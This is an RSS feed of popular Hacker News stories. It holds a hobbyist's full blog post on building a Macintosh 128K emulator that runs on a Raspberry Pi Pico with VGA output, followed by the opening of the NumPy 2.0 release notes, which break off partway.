<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 17 Jun 2024 00:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[MicroMac, a Macintosh for Under £5 (251 pts)]]></title>
            <link>https://axio.ms/projects/2024/06/16/MicroMac.html</link>
            <guid>40699684</guid>
            <pubDate>Sun, 16 Jun 2024 20:02:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://axio.ms/projects/2024/06/16/MicroMac.html">https://axio.ms/projects/2024/06/16/MicroMac.html</a>, See on <a href="https://news.ycombinator.com/item?id=40699684">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    
<p><a href="https://axio.ms/images/umac/umac_startup.png"> 
    <img src="https://axio.ms/images/umac/umac_startup.png" srcset="     https://axio.ms/images/umac/umac_startup.png 454w" width="100%" alt=" ">
 </a></p>

<h2 id="a-microcontroller-macintosh">A microcontroller Macintosh</h2>

<p>This all started from a conversation about the RP2040 MCU, and building a simple desktop/GUI for it.  I’d made a comment along the lines of “or, just run some old OS”, and it got me thinking about the <a href="https://en.wikipedia.org/wiki/Macintosh_128K">original Macintosh</a>.</p>

<p>The original Macintosh was released 40.5 years before this post, and is a pretty cool machine especially considering that the hardware is very simple.  <a href="https://www.stevenlevy.com/insanely-great">Insanely Great</a> and <a href="https://folklore.org/">folklore.org</a> are fun reads, and give a glimpse into the Macintosh’s development.  Memory was a squeeze; the original 128KB version was underpowered and only sold for a few months before being replaced by the <em>Macintosh 512K</em>, arguably a more appropriate amount of memory.</p>

<p>But, the 128 still runs <em>some</em> real applications and, though it pre-dates MultiFinder/actual multitasking, I found it pretty charming.  As a tourist.  In 1984 the Mac cost roughly 1/3 as much as a VW Golf and, as someone who’s into old computers and old cars, it’s hard to decide which is more frustrating to use.</p>

<p>So back to this £3.80 RPi Pico microcontroller board:  The RP2040’s 264KB of RAM gives a lot to play with after carving out the Mac’s 128KB – how cool would it be to do a quick hack, and play with a Mac on it?</p>

<p>Time passes.  A lot of time.  But I totally delivered on the janky hack front:</p>

<p><a href="https://axio.ms/images/umac/umac_whole.jpg"> 
    <img src="https://axio.ms/assets/resized/1400/umac_whole.jpg" srcset="            https://axio.ms/assets/resized/480/umac_whole.jpg 480w,            https://axio.ms/assets/resized/800/umac_whole.jpg 800w,            https://axio.ms/assets/resized/1400/umac_whole.jpg 1400w,    " width="100%" alt=" ">
 </a></p>

<p><del>You won’t believe that this quality item didn’t take that long to build.</del> So the software was obviously the <em>involved</em> part, and turned into work on 3 distinct projects.</p>

<p>This post is going to be a “development journey” story, as a kind of code/design/venting narrative.  If you’re just here for the pictures, scroll along!</p>

<h2 id="what-is-pico-mac">What is pico-mac?</h2>

<p>A Raspberry Pi RP2040 microcontroller (on a Pico board), driving monochrome VGA video and taking USB keyboard/mouse input, emulating a <em>Macintosh 128K</em> computer and disc storage.  The RP2040 has easily enough RAM to house the Mac’s memory, plus that of the emulator; it’s fast enough (with some tricks) to meet the performance of the real machine, has USB host capability, and the PIO department makes driving VGA video fairly uneventful (with some tricks).  The basic Pico board’s 2MB of flash is plenty for a disc image with OS and software.</p>

<p>Here’s the Pico MicroMac in action, ready for the paperless office of the future:</p>

<figure>
 <a href="https://axio.ms/images/umac/umac_workstation.jpg"> 
    <img src="https://axio.ms/assets/resized/1400/umac_workstation.jpg" srcset="            https://axio.ms/assets/resized/480/umac_workstation.jpg 480w,            https://axio.ms/assets/resized/800/umac_workstation.jpg 800w,            https://axio.ms/assets/resized/1400/umac_workstation.jpg 1400w,    " width="100%" alt=" The Pico MicroMac RISC CISC workstation of the future">
 </a> 
<figcaption>The Pico MicroMac RISC CISC workstation of the future</figcaption></figure>

<p>I hadn’t really used a <em>Mac 128K</em> much before; a few clicks on a museum machine once.  But I knew they ran MacDraw, and MacWrite, and MacPaint.  All three of these applications are pretty cool for a 128K machine; a largely WYSIWYG word processor with multiple fonts, and a vector drawing package.</p>

<p>A great way of playing with early Macintosh system software, and applications of these wonderful machines is via <a href="https://infinitemac.org/">https://infinitemac.org</a>, which has shrinkwrapped running the Mini vMac emulator by emscriptening it to run in the browser.  Highly recommended, lots to play with.</p>

<p>As a spoiler, MicroMac does run MacDraw, and it was great to play with it on “real fake hardware”:</p>

<p><a href="https://axio.ms/images/umac/umac_workstation2.jpg"> 
    <img src="https://axio.ms/assets/resized/1400/umac_workstation2.jpg" srcset="            https://axio.ms/assets/resized/480/umac_workstation2.jpg 480w,            https://axio.ms/assets/resized/800/umac_workstation2.jpg 800w,            https://axio.ms/assets/resized/1400/umac_workstation2.jpg 1400w,    " width="100%" alt=" ">
 </a></p>

<p>(Do you find “Pico Micro Mac” doesn’t really scan?  I didn’t think this taxonomy through, did I?)</p>

<p>GitHub links are at the bottom of this page:  the <code>pico-mac</code> repo has <a href="https://github.com/evansm7/pico-mac?tab=readme-ov-file#hardware-contruction">construction directions</a> if you want to build your own!</p>

<h2 id="the-journey">The journey</h2>

<p>Back up a bit.  I wasn’t committed to building a Pico thing, but was vaguely interested in whether it was feasible, so started tinkering with building a <em>Mac 128K emulator</em> on my normal computer first.</p>

<h3 id="the-three-rules">The three rules</h3>

<p>I had a few simple rules for this project:</p>

<ol>
  <li>It had to be fun.  It’s OK to hack stuff to get it working, it’s not as though I’m being paid for this.</li>
  <li>I like writing emulation stuff, but I really don’t want to learn 68K assembler, or much about the 68K.  There’s a lot of love for 68K out there and that’s cool, but meh I don’t adore it as a CPU.  So, right from the outset I wanted to use someone else’s 68K interpreter – I knew there were loads around.</li>
  <li>Similarly, there are a load of OSes whose innards I’d like to learn more about, but the shittiest early Mac System software isn’t high on the list.  Get in there, emulate the hardware, boot the OS as a black box, done.</li>
</ol>

<p>I ended up breaking 2 of and sometimes all 3 of these rules during this project.</p>

<h3 id="the-mac-128k">The Mac 128K</h3>

<p>The machines are generally pretty simple, and of their time.  I started with schematics and <em>Inside Macintosh</em>, PDFs of which covered various details of the original Mac hardware, memory map, mouse/keyboard, etc.</p>
<ul>
  <li><a href="https://tinkerdifferent.com/resources/macintosh-128k-512k-schematics.79/">https://tinkerdifferent.com/resources/macintosh-128k-512k-schematics.79/</a></li>
  <li><a href="https://vintageapple.org/inside_o/">https://vintageapple.org/inside_o/</a> <em>Inside Macintosh Volumes I-III</em> are particularly useful for hardware information; also <em>Guide to Macintosh Family Hardware 2nd Edition</em>.</li>
</ul>

<p>The Macintosh has:</p>
<ul>
  <li>A Motorola 68000 CPU running at <del>7.whatever MHz</del> roughly 8MHz</li>
  <li>Flat memory, decoded into regions for memory-mapped IO going to the 6522 VIA, the 8530 SCC, and the IWM floppy controller.  (Some of the address decoding is a little funky, though.)</li>
  <li>Keyboard and mouse hang off the VIA/SCC chips.</li>
  <li>No external interrupt controller: the 68K has 3 IRQ lines, and there are 3 IRQ sources (VIA, SCC, programmer switch/NMI).</li>
  <li>“No slots” or expansion cards.</li>
  <li>No DMA controller: a simple autonomous PAL state machine scans video (and audio samples) out of DRAM.  Video is fixed at 512x342 1BPP.</li>
  <li>The only storage is an internal FDD (plus an external drive), driven by the IWM chip.</li>
</ul>

<p>The first three Mac models are extremely similar:</p>
<ul>
  <li>The <em>Mac 128K</em> and <em>Mac 512K</em> are the same machine, except for RAM.</li>
  <li>The <em>Mac Plus</em> added SCSI to a convenient space in the memory map and an 800K floppy drive, which is double-sided whereas the original was a single 400K side.</li>
  <li>The <em>Mac Plus</em> ROM also supports the 128K/512K, and was an upgrade to create the <em>Macintosh 512Ke</em>.  ‘e’ for Extra ROM Goodness.</li>
</ul>

<p>The <em>Mac Plus</em> ROM supports the HD20 external hard disc, and HFS, <em>and</em> Steve Chamberlin has <a href="https://www.bigmessowires.com/rom-adapter/plus-rom-listing.asm">annotated a disassembly of it</a>.  This was the ROM to use:  I was making a <em>Macintosh 128Ke</em>.</p>

<h3 id="mac-emulator-umac">Mac emulator: umac</h3>

<p>After about 8 minutes of research, I chose the <a href="https://github.com/kstenerud/Musashi">Musashi</a> 68K interpreter.  It’s C, simple to interface to, and had a simple out-of-box example of a 68K system with RAM, ROM, and some IO.  <em>Musashi</em> is structured to be embedded in bigger projects: wire in memory read/write callbacks, a function to raise an IRQ, call execute in a loop, done.</p>

<p>I started building an emulator around it, which ultimately became the <a href="https://github.com/evansm7/umac">umac</a> project.  The first half (of, say, five halves) went pretty well:</p>

<ol>
  <li>A simple commandline app loading the ROM image, allocating RAM, providing debug messages/assertions/logging, and configuring <em>Musashi</em>.</li>
  <li>Add address decoding: CPU reads/writes are steered to RAM, or ROM.  The “overlay” register lets the ROM boot at <code>0x00000000</code> and then trampoline up to a high ROM mirror after setting up CPU exception vectors – this affects the address decoding.  This is done by poking a VIA register, so decoded just that bit of that register for now.</li>
  <li>At this point, the ROM starts running and accessing more non-existent VIA and SCC registers.  Added more decoding and a skeleton for emulating these devices elsewhere – the MMIO read/writes are just stubbed out.</li>
  <li>There are some magic addresses that the ROM accesses that “miss” documented devices: there’s a manufacturing test option that probes for a plugin (just thunk it), and then we witness the RAM size probing.  The <em>Mac Plus</em> ROM is looking for up to 4MB of RAM.  In the large region devoted to RAM, the smaller amount of actual RAM is mirrored over and over, so the probe writes a magic value at high addresses and spots where it starts to wrap around.</li>
  <li>RAM is then initialised and filled with a known pattern.  This was an exciting point to get to because I could dump the RAM, convert the region used for the video framebuffer into an image, and see the “diagonal stripe” pattern used for RAM testing!  <em>“She’s alive!”</em></li>
  <li>Not all of the device code enjoyed reading all zeroes, so there was a certain amount of referring to the disassembly and returning, uh, <code>0xffffffff</code> sometimes to push it further.  The goal was to get it as far as accessing the IWM chip, i.e. trying to load the OS.</li>
  <li>After seeing some IWM accesses there and returning random rubbish values, the first wonderful moment was getting the “Unknown Disc” icon with the question mark – real graphics!  The ROM was <em>REALLY DOING SOMETHING!</em></li>
  <li>I <em>think</em> I hadn’t implemented any IRQs at this point, and found the ROM in an infinite loop: it was counting a few Vsyncs to delay the flashing question mark.  Diversion into a better VIA, with callbacks for GPIO register read/write, and IRQ handling.  This also needed to wire into <em>Musashi</em>’s IRQ functions.</li>
</ol>

<p>This was motivating to get to – remembering rule #1 – and “graphics”, even though via a manual memory dump/ImageMagick conversion, was great.</p>

<p>I knew the <a href="https://en.wikipedia.org/wiki/Integrated_Woz_Machine">IWM</a> was an “interesting” chip, but didn’t know details.  I planned to figure it out when I got there (rule #1).</p>

<h4 id="iwm-68k-and-disc-drivers">IWM, 68K, and disc drivers</h4>

<p>My god, I’m glad I put IWM off until this point.  If I’d read the “datasheet” (vague register documentation) first, I’d’ve just gone to the pub instead of writing this shitty emulator.</p>

<p>IWM is very clever, but very very low-level.  The disc controllers in other contemporary machines, e.g. <a href="https://en.wikipedia.org/wiki/Western_Digital_FD1771">WD1770</a>, abstract the disc physics.  At one level, you can poke regs to step to track 17 and then ask the controller to grab sector 3.  Not so with IWM:  first, the discs are Constant Linear Velocity, meaning the angular rotation needs to change appropriate to whichever track you’re on, and second the IWM just gives the CPU a firehose of crap from the disc head (with minimal decoding).  I spent a while reading through the disassembly of the ROM’s IWM driver (breaking rule #2 and rule #1): there’s some kind of servo control loop where the driver twiddles PWM values sent to a DAC to control the disc motor, measured against a VIA timer reference to do some sort of dynamic rate-matching to get the correct bitrate from the disc sectors.  I think once it finds the track start it then streams the track into memory, and the driver decodes the symbols (more clever encoding) and selects the sector of interest.</p>

<p>I was sad.  Surely <em>Basilisk II</em> and <em>Mini vMac</em> etc. had solved this in some clever way – they emulated floppy discs.  I learned they do not, and do the smart engineering thing instead:  avoid the problem.</p>

<p>The other emulators do quite a lot of ROM patching: the ROM isn’t run unmodified.  You can argue that this then isn’t a perfect hardware emulation if you’re patching out inconvenient parts of the ROM, but so what.  I suspect they were also abiding by a rule #1 too.</p>

<p>I was going to do the same:  I figured out a bit of how the Mac driver interface works (gah, rule #3!) and understood how the other emulators patched this.  They use a custom <em>paravirtualised</em> 68K driver which is copied over the ROM’s IWM driver, servicing <code>.Sony</code> requests from the block layer and routing them to more convenient host-side code to manage the requests.  <em>Basilisk II</em> uses some custom 68K opcodes and a simple driver, and <em>Mini vMac</em> a complex driver with trappy accesses to a custom region of memory.  I reused the <em>Basilisk II</em> driver but converted to access a trappy region (easier to route: just emulate another device).  The driver callbacks land in the host/C side and some cut-down <em>Basilisk II</em> code interprets the requests and copies data to/from the OS-provided buffers.  Right now, all I needed was to read blocks from one disc:  I didn’t need different formats (or even write support), or multiple drives, or ejecting/changing images.</p>

<p>Getting the first block loaded from disc took waaaayyy longer than the first part.  And, I’d had to learn a bit of 68K (gah), but just in the nick of time I got a Happy Mac icon as the System software started to load.</p>

<p>This was still a simple Linux commandline application, with zero UI.  No keyboard or mouse, no video.  Time to wrap it in an SDL2 frontend (the <code>unix_main</code> test build in the <code>umac</code> project), and I could watch the screen redraw live.  I hadn’t coded the 1Hz timer interrupt into the VIA, and after adding that it booted to a desktop!</p>

<figure>
 <a href="https://axio.ms/images/umac/umac_first_desktop.png"> 
    <img src="https://axio.ms/assets/resized/480/umac_first_desktop.png" srcset="            https://axio.ms/assets/resized/480/umac_first_desktop.png 480w,    " width="100%" alt=" The first boot">
 </a> 
<figcaption>The first boot</figcaption></figure>

<p>As an aside, I try to create a dual-target build for all my embedded projects, with a native host build for rapid prototyping/debugging; libSDL instead of an LCD.  It means I don’t need to code <em>at</em> the MCU, so I can code in the garden.  :)</p>

<p>Next was mouse support.  <em>Inside Macintosh</em> and the schematics show how it’s wired, to the VIA (good) and the SCC (a beast).  The SCC is my second least-favourite chip in this machine; it’s complex and the datasheet/manual seems to be intentionally written to hide information, piss off readers, get one back at the world.  (I didn’t go near the serial side, its main purpose, just external IRQ management.  But, it’ll do all kinds of exciting 1980s line coding schemes, offloading bitty work from the CPU.  It was key for supporting things like AppleTalk.)</p>

<p>Life was almost complete at this point; with a working mouse I could build a new disc image (using <em>Mini vMac</em>, an exercise in itself) with <em>Missile Command</em>.  This game is pretty fun for under 10KB on disc.</p>

<p>So:</p>
<ul>
  <li>Video works</li>
  <li>Boots from disc</li>
  <li>Mouse works, Missile Command</li>
</ul>

<p>I had no keyboard, but it’s largely working now.  Time to start on sub-project numero due:</p>

<h3 id="hardware-and-rp2040">Hardware and RP2040</h3>

<p>Completely unrelated to <code>umac</code>, I built up a circuit and firmare with two goals:</p>

<ol>
  <li>Display 512x342x1 video to VGA with minimal components,</li>
  <li>Get the TinyUSB HID example working and integrated.</li>
</ol>

<p>This would just display a test image copied to a framebuffer, and <code>printf()</code> keyboard/mouse events, as a PoC.  The video portion was fun:  I’d done some <code>I2S</code> audio PIO work before, but here I wanted to scan out video and arbitrarily control Vsync/Hsync.</p>

<p>Well, to test I needed a circuit.  VGA wants 0.7V max on the video R,G,B signals and (mumble, some volts) on the syncs.  The R,G,B signals are 75Ω to ground:  with some maths, a 3.3V GPIO driving all three through a 100Ω resistor is roughly right.</p>

<p>The day I started soldering it together I needed a VGA connector.  I had a DB15 but wanted it for another project, and felt bad about cutting up a VGA cable.  But when I took a walk at lunchtime, no shitting you, I passed some street cables.  I had a VGA cable – the rust helps with the janky aesthetic.</p>

<figure>
 <a href="https://axio.ms/images/umac/street_wire.jpg"> 
    <img src="https://axio.ms/assets/resized/1400/street_wire.jpg" srcset="            https://axio.ms/assets/resized/480/street_wire.jpg 480w,            https://axio.ms/assets/resized/800/street_wire.jpg 800w,            https://axio.ms/assets/resized/1400/street_wire.jpg 1400w,    " width="100%" alt=" Free VGA cable">
 </a> 
<figcaption>Free VGA cable</figcaption></figure>

<p>The <a href="https://github.com/evansm7/pico-mac/blob/main/src/pio_video.pio">VGA PIO side</a> was pretty fun.  It ended up as PIO reading config info dynamically to control Hsync width, display position, and so on, and then some tricks with DMA to scan out the config info interleaved with framebuffer data.  By shifting the bits in the right direction and by using the byteswap option on the RP2040 DMA, the big-endian Mac framebuffer can be output directly without CPU-side copies or format conversion.  Cool.  This can be fairly easily re-used in other projects: see <a href="https://github.com/evansm7/pico-mac/blob/main/src/video.c">video.c</a>.</p>

<p>But.  I ended up (re)writing the video side three times in total:</p>

<p>First version had two DMA channels writing to the PIO TX FIFO.  The first would transfer the config info, then trigger the second to transfer video data, then raise an IRQ.  The IRQ handler would then have a short time (the FIFO depth!) to choose a new framebuffer address to read from, and reprogram DMA.  It worked OK, but was highly sensitive to other activity in the system.  First and most obvious fix is that any latency-sensitive IRQ handler <em>must</em> have the <code>__not_in_flash_func()</code> attribute so as to run out of RAM.  But even with that, the design didn’t give much time to reconfigure the DMA:  random glitches and blanks occurred when moving the mouse rapidly.</p>

<p>Second version did double-buffering with the goal of making the IRQ handler’s job trivial: poke in a pre-prepared DMA config quickly, then after the critical rush calculate the buffer to use for next time.  Lots better, but still some glitches under some high load.  Even weirder, it’d sometimes just blank out completely, requiring a reset.  This was puzzling for a while; I ended up printing out the PIO FIFO’s <code>FDEBUG</code> register to try to catch the bug in the act.  I saw that the <code>TXOVER</code> overflow flag was set, and this should be impossible: the FIFOs pull data from DMA on demand with DMA requests and a credited flow-contr…OH WAIT.  If credits get messed up or duplicated, too many transfers can happen, leading to an overflow at the receiver side.</p>

<p>Well, I’d missed a subtle rule in the RP2040 DMA docs:</p>

<blockquote>
  <p>Another caveat is that multiple channels should not be connected to the same DREQ.</p>
</blockquote>

<p>So the third version…… doesn’t break this rule, and is more complicated as a result:</p>
<ul>
  <li>One DMA channel transfers to the PIO TX FIFO</li>
  <li>Another channel programs the first channel to send from the config data buffer</li>
  <li>A third channel programs the first to send the video data</li>
  <li>The programming of the first triggers the corresponding “next reprogram me” channel</li>
</ul>

<p>The nice thing – aside from no lock-ups or video corruption – is that this now triggers a Hsync IRQ during the video line scan-out, greatly relaxing the deadline of reconfiguring the DMA.  I’d like to further improve this (with yet another DMA channel) to transfer without an IRQ per line, as the current IRQ overhead of about 1% of CPU time can be avoided.</p>

<p>(It would’ve been simpler to just hardwire the VGA display timing in the PIO code, but I like (for future projects) being able to dynamically-reconfigure the video mode.)</p>

<p>So now we have a platform and firmware framework to embed <code>umac</code> into, HID in and video out.  The hardware’s done, fuggitthat’lldo, let’s throw it over to the software team:</p>

<figure>
 <a href="https://axio.ms/images/umac/umac_annotated.jpg"> 
    <img src="https://axio.ms/assets/resized/2048/umac_annotated.jpg" srcset="            https://axio.ms/assets/resized/480/umac_annotated.jpg 480w,            https://axio.ms/assets/resized/800/umac_annotated.jpg 800w,            https://axio.ms/assets/resized/1400/umac_annotated.jpg 1400w,            https://axio.ms/assets/resized/2048/umac_annotated.jpg 2048w,    " width="100%" alt=" How it all works">
 </a> 
<figcaption>How it all works</figcaption></figure>

<h3 id="back-to-emulating-things">Back to emulating things</h3>

<p>A glance at the native <code>umac</code> binary showed a few things to fix before it could run on the Pico:</p>

<ul>
  <li><em>Musashi</em> constructed a <em>huge</em> opcode decode jumptable at runtime, in RAM.  It’s never built differently, and never changes at runtime.  I added a <em>Musashi</em> build-time generator so that this table could be <code>const</code> (and therefore live in flash).</li>
  <li>The disassembler was large, and not going to be used on the Pico, so another option to build without.</li>
  <li><em>Musashi</em> tries to accurately count execution cycles for each instruction, with more large lookup tables.  Maybe useful for console games, but the Mac doesn’t have the same degree of timing sensitivity.  <em>REMOVED</em>.</li>
</ul>

<p>(This work is in my <a href="https://github.com/evansm7/Musashi/commits/small-build/">small-build</a> branch.)</p>

<p><code>pico-mac</code> takes shape, with the ROM and disc image in flash, and enjoyably it now builds and runs on the Pico!  With some careful attention to not shoving stuff in RAM, the RAM use is looking pretty good.  The emulator plus HID code is using about 35-40KB on top of the Mac’s 128KB RAM area – there’s 95+KB of RAM still free.</p>

<p>This was a good time to finish off adding the keyboard support to <code>umac</code>.  The Mac keyboard is interfaced serially through the VIA ‘shift register’, a basic synchronous serial interface.  This was logically simple, but frustrating because early attempts at replying to the ROM’s “init” command just were persistently ignored.  The ROM disassembly was super-useful again: reading the keyboard init code, it looked like a race condition in interrupt acknowledgement if the response byte appears too soon after the request is sent.  Shoved in a delay to hold off a reply until a later poll, and then it was just a matter of mapping keycodes (boooooorrrriiiiing).</p>

<p>With a keyboard, the end-of-level MacWrite boss is reached:</p>

<p><a href="https://axio.ms/images/umac/umac_macwrite.jpg"> 
    <img src="https://axio.ms/assets/resized/2048/umac_macwrite.jpg" srcset="            https://axio.ms/assets/resized/480/umac_macwrite.jpg 480w,            https://axio.ms/assets/resized/800/umac_macwrite.jpg 800w,            https://axio.ms/assets/resized/1400/umac_macwrite.jpg 1400w,            https://axio.ms/assets/resized/2048/umac_macwrite.jpg 2048w,    " width="100%" alt=" ">
 </a></p>

<p>One problem though:  it totally sucked.  It was suuuuper slow.  I added a 1Hz dump of instruction count, and it was doing about 300 KIPS.</p>

<p>The 68000 isn’t an amazing CPU in terms of IPC.  Okay, there are some instructions that execute in 4 cycles.  But you want to use those extravagant addressing modes don’t you, and touching memory is spending those cycles all over the place.  Not an expert, but targeting about 1 MIPS for an about 8MHz 68000 seems right.  Only 3x improvement needed.</p>

<h3 id="performance">Performance</h3>

<p>I didn’t say I wasn’t gonna cheat:  let’s run that Pico at 250MHz instead of 125MHz.  Okay better, but not 2x better.  From memory, only about 30% better.  Damn, no free lunch today.</p>

<p><em>Musashi</em> has a lot of configurable options.  My first goal was to get its main loop (as seen from disassembly/post-compile end!) small:  the Mac doesn’t report Bus Errors, so the registers don’t need copies for unwinding.  The opcodes are always fetched from a 16b boundary, so don’t need alignment checking, and can use halfword loads (instead of two byte loads munged into a halfword!).  For the Cortex-M0+/<code>armv6m</code> ISA, reordering some of the CPU context structure fields enabled immediate-offset access and better code.  The CPU type, mysteriously, was dynamically-changeable and led to a bunch of runtime indirection.</p>

<p>Looking better, maybe 2x improvement, but not enough.  <em>Missile Command</em> was still janky and the mouse wasn’t smooth!</p>

<p>Next, some naughty/dangerous optimisations: remove address alignment checking, because unaligned accesses don’t happen <em>in this constrained environment</em>.</p>

<p>(Then, this work is in my <a href="https://github.com/evansm7/Musashi/commits/umac-hacks">umac-hacks</a> branch.)</p>

<p>But the real perf came from a different trick.  First, a diversion!</p>

<h4 id="rp2040-memory-access">RP2040 memory access</h4>

<p>The RP2040 has fast RAM, which is multi-banked so as to allow generally single-cycle access to multiple users (2 CPUs, DMA, etc.).  Out of the box, most code runs via XIP from external QSPI flash.  The QSPI usually runs at the core clock (125MHz default), but has a latency of ~20 cycles for a random word read.  The RP2040 uses a relatively simple 16KB cache in front of the flash to protect you from horrible access latency, but the more code you have the more likely you are to call a function and have to crank up QSPI.  When overclocking to 250MHz, the QSPI can’t go that fast so stays at 125MHz (I think).  Bear in mind, then, that your 20ish QSPI cycles on a miss become 40ish CPU cycles.</p>

<p>The particular rock-and-a-hard-place here is that <em>Musashi</em> build-time generates a ton of code, a function for each of its 1968 opcodes, plus that 256KB opcode jumptable.  Even if we make the inner execution loop completely free, the opcode dispatch might miss in the flash cache, and the opcode function itself too.  (If we want to get 1 MIPS out of about 200 MIPS, a few of these delays are going to really add up.)</p>

<p>The <code>__not_in_flash_func()</code> attribute can be used to copy a given function into RAM, guaranteeing fast execution.  At the very minimum, the main loop and memory accessors are decorated:  every instruction is going to access an opcode and most likely read or write RAM.</p>

<p>This improves performance a few percent.</p>

<p>Then, I tried decorating whole classes of opcodes: <code>move</code> is frequent, as are branches, so put ‘em in RAM.  This helped a lot, but the remaining free RAM was used up very quickly, and I wasn’t at my goal of much above 1 MIPS.</p>

<p>Remember that <a href="https://en.wikipedia.org/wiki/Reduced_instruction_set_computer">RISC architecture</a> is gonna change everything?</p>

<p>We want to put some of those 1968 68K opcodes into RAM to make them fast.  What are the top 10 most often-used instructions?  Top 100?  By adding a 64K table of counters to <code>umac</code>, booting the Mac and running key applications (okay, playing <em>Missile Command</em> for a bit), we get a profile of dynamic instruction counts.  It turns out that the 100 hottest opcodes (5% of the total) account for 89% of the execution.  And the top 200 account for a whopping 98% of execution.</p>

<p>Armed with this profile, the <code>umac</code> build post-processes the <em>Musashi</em> auto-generated code and decorates the top 200 functions with <code>__not_in_flash_func()</code>.  This adds only 17KB of extra RAM usage (leaving 95KB spare), and hits about 1.4 MIPS!  Party on!</p>

<p>At last, the world can enjoy <em>Missile Command</em>’s dark subject matter in performant comfort:</p>

<figure>
 <a href="https://axio.ms/images/umac/umac_missile.jpg"> 
    <img src="https://axio.ms/assets/resized/1400/umac_missile.jpg" srcset="            https://axio.ms/assets/resized/480/umac_missile.jpg 480w,            https://axio.ms/assets/resized/800/umac_missile.jpg 800w,            https://axio.ms/assets/resized/1400/umac_missile.jpg 1400w,    " width="100%" alt=" Missile Command on pico-mac">
 </a> 
<figcaption>Missile Command on pico-mac</figcaption></figure>

<h3 id="what-about-macpaint">What about MacPaint?</h3>

<p>Everyone loves MacPaint.  Maybe <em>you</em> love MacPaint, and have noticed I’ve deftly avoided mentioning it.  Okay, FINE:</p>

<p><img src="https://axio.ms/images/umac/macpaint_mem.png" alt="There is not enough memory for MacPaint!"></p>

<p>It doesn’t run on a <em>Mac 128Ke</em>, because the <em>Mac Plus</em> ROM uses more RAM than the original.  :sad-face:</p>

<p>I’d seen this thread on 68kMLA about a “Mac 256K”: <a href="https://68kmla.org/bb/index.php?threads/the-mythical-mac-256k.46149/">https://68kmla.org/bb/index.php?threads/the-mythical-mac-256k.46149/</a>  Chances are that the <em>Mac 128K</em> was really a <em>Mac 256K</em> in the lab (or maybe even intended to have 256K and cost-cut before release), as the OS functions fine with 256KB.</p>

<p>I wondered, does the Mac ROM/OS need a power-of-two amount of RAM?  If not, I have that 95K going spare.  Could I make a “Mac 200K”, and then run precious MacPaint?</p>

<p>Well, I tried a local hack that patches the ROM to update its global <code>memTop</code> variable based on a given memory size, and yes, System 3.2 is happy with non-power-of-2 sizes.  I booted with 256K, 208K, and 192K.  However, there were some additional problems to solve:  the ROM memtest craps itself without a power-of-2 size (totally fair), and NOPping that out leads to other issues.  These can be fixed, though also some parts of boot access off the end of RAM.  A power-of-2 size means a cheap address mask wraps RAM accesses to the valid buffer, and that can’t be done with 192K.</p>

<p>Unfortunately, when I then tested MacPaint it <em>still</em> wouldn’t run because it wanted to write a scratch file to the read-only boot volume.  This is totally breaking rule #1 by this point, so we are staying with 128KB for now.</p>

<p>However, a 256K MicroMac is extremely possible.  We just need an MCU with, say, 300KB of RAM…  Then we’d be cooking on gas.</p>

<h2 id="goodbye-friend">Goodbye, friend</h2>

<p>Well, dear reader, this has been a blast.  I hope there’s been something fun here for ya.  Ring off now, caller!</p>



<h2 id="resources">Resources</h2>

<ul>
  <li><a href="https://github.com/evansm7/umac">https://github.com/evansm7/umac</a></li>
  <li><a href="https://github.com/evansm7/pico-mac">https://github.com/evansm7/pico-mac</a></li>
  <li><a href="https://www.macintoshrepository.org/7038-all-macintosh-roms-68k-ppc-">https://www.macintoshrepository.org/7038-all-macintosh-roms-68k-ppc-</a></li>
  <li><a href="https://winworldpc.com/product/mac-os-0-6/system-3x">https://winworldpc.com/product/mac-os-0-6/system-3x</a></li>
  <li><a href="https://68kmla.org/bb/index.php?threads/macintosh-128k-mac-plus-roms.4006/">https://68kmla.org/bb/index.php?threads/macintosh-128k-mac-plus-roms.4006/</a></li>
  <li><a href="https://docs.google.com/spreadsheets/d/1wB2HnysPp63fezUzfgpk0JX_b7bXvmAg6-Dk7QDyKPY/edit#gid=840977089">https://docs.google.com/spreadsheets/d/1wB2HnysPp63fezUzfgpk0JX_b7bXvmAg6-Dk7QDyKPY/edit#gid=840977089</a></li>
</ul>

  </div>

</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NumPy 2.0 (120 pts)]]></title>
            <link>https://numpy.org/devdocs/release/2.0.0-notes.html</link>
            <guid>40699470</guid>
            <pubDate>Sun, 16 Jun 2024 19:32:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://numpy.org/devdocs/release/2.0.0-notes.html">https://numpy.org/devdocs/release/2.0.0-notes.html</a>, See on <a href="https://news.ycombinator.com/item?id=40699470">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
                  
  <section id="numpy-2-0-0-release-notes">

<div>
<p>Note</p>
<p>The release of 2.0 is in progress and the current release overview and
highlights are still in a draft state. However, the highlights should
already list the most significant changes detailed in the full notes below,
and those full notes should be complete (if not copy-edited well enough
yet).</p>
</div>
<p>NumPy 2.0.0 is the first major release since 2006. It is the result of X months
of development since the last feature release by Y contributors, and contains a
large amount of exciting new features as well as a large amount of changes to
both the Python and C APIs.</p>
<p>This major release includes breaking changes that could not happen in a regular
minor (feature) release - including an ABI break, changes to type promotion
rules, and API changes which may not have been emitting deprecation warnings
in 1.26.x. Key documents related to how to adapt to changes in NumPy 2.0, in
addition to these release notes, include:</p>
<ul>
<li><p>The <a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#numpy-2-migration-guide"><span>NumPy 2.0 migration guide</span></a></p></li>
<li><p>The <a href="https://numpy.org/devdocs/dev/depending_on_numpy.html#numpy-2-abi-handling"><span>NumPy 2.0-specific advice</span></a> in
<a href="https://numpy.org/devdocs/dev/depending_on_numpy.html#for-downstream-package-authors"><span>For downstream package authors</span></a></p></li>
</ul>
<section id="highlights">
<h2>Highlights<a href="#highlights" title="Link to this heading">#</a></h2>
<p>Highlights of this release include:</p>
<ul>
<li><p>New features:</p>
<ul>
